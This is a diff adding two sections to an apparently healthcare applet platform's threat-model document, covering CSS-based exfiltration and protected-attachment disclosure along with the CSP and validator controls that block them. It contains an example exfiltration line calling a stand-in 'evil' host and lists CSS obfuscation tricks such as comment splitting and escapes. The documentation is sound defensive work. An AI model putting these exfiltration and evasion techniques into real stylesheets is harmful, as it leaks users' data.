@@ -200,6 +200,48 @@ The product should distinguish **silent machine exfiltration** from ordinary aut
 
 A worker cannot be preempted from inside the same worker. Hard termination by the host is essential.
 
+### 10. CSS exfiltration (applet stylesheets)
+
+**Attack:** an applet supplies CSS that fetches an attacker URL —
+`background: url(https://evil?leak=…)`, `@import`, `@font-face src`,
+`filter: url()`, `cursor: url()`, hidden behind comments (`ur/**/l`), escapes
+(`\75rl`), or `var()` indirection.
+
+**The guarantee is the CSP, not the validator.** An applet stylesheet is installed
+into the host document (its ShadowRoot), so every resource it can load is governed by
+the **host page CSP**. The CSS-reachable directives are all locked to non-external —
+`img-src data: blob:`, `font-src 'self' data:`, `style-src 'self' 'unsafe-inline'`,
+fallback `default-src 'self'`. **CSS cannot use `connect-src`** (the one open
+directive, used by the wrapper to load applets/reach FHIR); it loads resources only
+through the image/font/style directives. CSP's mandatory fallback chain means even a
+*future* CSS-fetch feature resolves to `default-src` — so external exfil is blocked by
+construction, not by recognizing each trick. The browser refuses the request.
+
+**Defense-in-depth (the validator).** `css-validator.ts` parses with postcss,
+normalizes comments + escapes (so `ur/**/l` and `\75rl` collapse to `url`), and
+validates every declaration value (including custom properties — `var()` can only
+re-inject already-validated tokens). It closes the only residual the CSP leaves —
+*same-origin* CSS fetches into the wrapper's own logs — and gives a clear error
+instead of a silent CSP block. It is a second fail-closed layer, not the boundary.
+
+### 11. Protected attachment disclosure
+
+**Attack:** turn a displayed document into an exfil sink, or extract the token-bearing
+URL.
+
+**Controls.** The applet cannot make an `<img src>` to an external URL at all: there
+is no raw `<img>` (curated element set + firewall), `ui-image` accepts only an opaque
+`handle` (no `src`/attributes), and the host CSP `img-src data: blob:` blocks external
+image loads regardless. The **handle** (`session.files.open`) is therefore *not* the
+img-exfil control — it provides credential isolation (the broker fetches with the
+token host-side; the applet never holds URL or token), keeps multi-MB binaries off the
+worker boundary, gives defense-in-depth (no URL in the applet's hands to point
+anywhere), and a revocable blob lifecycle.
+
+> Note on the API: capabilities are exposed to applets as one `session` object
+> (`session.smart` / `ai` / `styles` / `files` / `audit`), each backed by a single
+> host handler that is the one enforcement point — see ARCHITECTURE.md / HOST_API.md.
+
 ## Security claim language
 
 Recommended:
